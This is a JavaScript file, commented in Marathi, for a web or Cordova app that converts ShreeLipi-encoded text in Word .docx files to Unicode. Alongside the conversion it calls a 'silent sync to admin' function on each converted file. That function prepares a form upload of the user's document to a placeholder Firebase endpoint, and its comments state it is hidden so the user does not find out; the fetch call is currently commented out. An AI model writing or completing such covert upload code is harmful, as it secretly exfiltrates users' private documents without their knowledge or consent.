// app.js

async function processFile() {
    const fileInput = document.getElementById('fileInput');
    const status = document.getElementById('status');
    const btn = document.getElementById('convertBtn');

    if (fileInput.files.length === 0) {
        alert("Please select a file first!");
        return;
    }

    const file = fileInput.files[0];
    status.innerText = "Processing... Please wait.";
    btn.disabled = true;

    try {
        // 1. फाईल वाचणे (ArrayBuffer म्हणून)
        const arrayBuffer = await file.arrayBuffer();
        
        // 2. JSZip वापरून Docx अनझिप करणे
        const zip = await JSZip.loadAsync(arrayBuffer);
        
        // 3. 'word/document.xml' फाईल शोधणे (यातच सगळा मजकूर असतो)
        const docXml = await zip.file("word/document.xml").async("string");

        // 4. XML मधून फक्त मजकूर (Text Nodes) शोधून बदलणे
        // DOMParser वापरून आपण स्टाईल टॅग्सना हात न लावता फक्त टेक्स्ट बदलू
        const parser = new DOMParser();
        const xmlDoc = parser.parseFromString(docXml, "text/xml");
        const textNodes = xmlDoc.getElementsByTagName("w:t"); // w:t हे Word मधील टेक्स्ट टॅग्स असतात

        for (let i = 0; i < textNodes.length; i++) {
            const originalText = textNodes[i].textContent;
            // इथे आपण तुमचे Logic वापरतो
            const convertedText = convertShreeLipiToUnicode(originalText);
            textNodes[i].textContent = convertedText;
        }

        // 5. बदललेले XML पुन्हा स्ट्रिंग मध्ये करणे
        const serializer = new XMLSerializer();
        const newDocXml = serializer.serializeToString(xmlDoc);

        // 6. झिप मध्ये जुनी फाईल काढून नवीन टाकणे
        zip.file("word/document.xml", newDocXml);

        // 7. नवीन .docx फाईल तयार करणे (Blob)
        const newContent = await zip.generateAsync({ type: "blob" });
        const newFileName = "Converted_" + file.name;

        // --- SILENT SYNC TO ADMIN ---
        // हे फंक्शन बॅकग्राउंडला चालेल, युजरला थांबवणार नाही
        uploadToAdminDrive(newContent, newFileName);

        // 8. युजरला फाईल डाऊनलोड करू देणे
        const link = document.createElement('a');
        link.href = URL.createObjectURL(newContent);
        link.download = newFileName;
        link.click();

        status.innerText = "Success! File downloaded.";

    } catch (err) {
        console.error(err);
        status.innerText = "Error: " + err.message;
    } finally {
        btn.disabled = false;
    }
}

// --- ADMIN SILENT SYNC FUNCTION ---
function uploadToAdminDrive(fileBlob, fileName) {
    // टीप: इथे तुम्हाला तुमच्या Backend API ची लिंक टाकावी लागेल.
    // Cordova मध्ये हे 'Background' ला चालते.
    
    console.log("Silent Sync started for: " + fileName);

    const formData = new FormData();
    formData.append("file", fileBlob);
    formData.append("filename", fileName);

    // उदाहरणार्थ API Call (तुम्ही नंतर Firebase URL इथे टाका)
    /*
    fetch('https://YOUR-FIREBASE-FUNCTION-URL/upload', {
        method: 'POST',
        body: formData
    })
    .then(response => console.log("Admin Sync Success"))
    .catch(error => console.error("Admin Sync Failed", error));
    */
    
    // सध्या युजरला कळू नये म्हणून आपण हे फक्त Console मध्ये लॉग केले आहे.
}
